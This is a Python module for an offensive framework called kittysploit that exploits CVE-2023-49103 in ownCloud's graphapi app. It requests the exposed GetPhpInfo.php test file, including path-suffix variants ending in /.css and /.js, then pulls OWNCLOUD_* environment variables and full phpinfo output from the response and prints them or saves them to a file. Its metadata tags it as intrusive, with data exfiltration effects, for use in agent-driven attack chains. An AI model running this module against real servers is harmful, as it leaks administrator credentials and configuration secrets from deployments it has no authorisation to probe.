#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""ownCloud graphapi GetPhpInfo.php credential/config leak (CVE-2023-49103)."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Auxiliary, Http_client):
    __info__ = {
        'name': 'ownCloud - graphapi phpinfo Leak (CVE-2023-49103)',
        'description': (
            'Fetches GetPhpInfo.php exposed by ownCloud graphapi and extracts phpinfo / '
            'OWNCLOUD_* environment variables (CVE-2023-49103 / CVE-2023-49282).'
        ),
        'author': ['KittySploit Team'],
        'cve': ['CVE-2023-49103', 'CVE-2023-49282'],
        'platform': Platform.MULTI,
        'references': [
            'https://owncloud.com/security-advisories/disclosure-of-sensitive-credentials-and-configuration-in-containerized-deployments/',
            'https://nvd.nist.gov/vuln/detail/CVE-2023-49103',
        ],
        'tags': ['owncloud', 'phpinfo', 'exposure', 'credentials', 'unauth', 'cve-2023-49103'],
        'agent': {
            'risk': 'intrusive',
            'effects': ['data_exfiltration'],
            'expected_requests': 3,
            'reversible': True,
            'approval_required': True,
            'produces': ['risk_signals'],
            'cost': 1.2,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'admin_surface', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['scanner/http/cve_2023_49103_detect'],
            },
        },
    }

    base_path = OptString('', 'Optional ownCloud base path prefix', required=False)
    output_file = OptString('', 'Local file to write phpinfo HTML', required=False)
    output_limit = OptInteger(
        12000,
        'Max chars to print when output_file empty (0=full)',
        required=False,
        advanced=True,
    )

    def _prefix(self) -> str:
        base = str(self.base_path or '').strip()
        if not base or base == '/':
            return ''
        if not base.startswith('/'):
            base = '/' + base
        return base.rstrip('/')

    def run(self):
        prefix = self._prefix()
        paths = (
            f'{prefix}/apps/graphapi/vendor/microsoft/microsoft-graph/tests/GetPhpInfo.php',
            f'{prefix}/apps/graphapi/vendor/microsoft/microsoft-graph/tests/GetPhpInfo.php/.css',
            f'{prefix}/apps/graphapi/vendor/microsoft/microsoft-graph/tests/GetPhpInfo.php/.js',
        )
        for path in paths:
            print_status(f'Fetching {path} ...')
            r = self.http_request(method='GET', path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ''
            if not re.search(r'(phpinfo\(\)|PHP Version|_ENV\[)', body, re.I):
                continue
            print_success(f'phpinfo disclosure via {path}')
            for line in re.findall(r'OWNCLOUD_[A-Z0-9_]+[^<\n]{0,120}', body):
                print_info(line.strip())
            out = str(self.output_file or '').strip()
            if out:
                with open(out, 'w', encoding='utf-8', errors='replace') as fh:
                    fh.write(body)
                print_success(f'Wrote phpinfo to {out}')
            else:
                limit = int(self.output_limit or 0)
                print_info(body if limit <= 0 else body[:limit])
            return True
        print_error('GetPhpInfo.php not exposed')
        return False
